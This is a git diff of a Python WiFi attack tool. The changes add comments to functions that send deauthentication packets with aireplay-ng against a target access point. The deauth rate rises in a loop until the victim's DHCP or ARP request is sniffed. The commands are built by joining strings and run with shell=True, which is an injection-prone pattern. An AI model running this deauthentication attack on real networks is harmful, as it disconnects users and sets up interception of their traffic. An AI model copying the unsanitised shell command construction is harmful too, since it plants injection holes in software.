@@ -292,6 +292,7 @@ def dhcp_request_sniffer_prn(request):
 
 # region DHCP or DHCPv6 Request sniffer function
 def dhcp_request_sniffer():
+
     # region Set network filter
     network_filters = {'Ethernet': {'source': target_mac_address}}
     # endregion
@@ -312,15 +313,22 @@ def dhcp_request_sniffer():
 
 # region WiFi deauth packets sender
 def deauth_packets_send():
+
+    # Start DHCP or ARP requests sniffer function
     tm = ThreadManager(2)
     tm.add_task(dhcp_request_sniffer)
     sleep(3)
 
+    # Set WiFi channel on interface for send WiFi deauth packets
     sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel], shell=True)
     Base.print_info("Send WiFi deauth packets ...")
 
+    # Start deauth packets numbers = 3
     deauth_packets_number = 3
+
     while not sniff_dhcp_request:
+
+        # Start aireplay-ng process
         try:
             aireplay_process = sub.Popen(['aireplay-ng ' + deauth_network_interface +
                                           ' -0 ' + str(deauth_packets_number) + ' -a ' + bssid +
@@ -340,7 +348,7 @@ def deauth_packets_send():
                 Base.print_error("Something else went wrong while trying to run ", "`aireply-ng`")
                 exit(2)
 
-        # Wait before sniff dhcp request packet
+        # Wait before sniff ARP or DHCP request packet
         sleep(5)
 
         # Add 5 packets to number of WiFi deauth packets
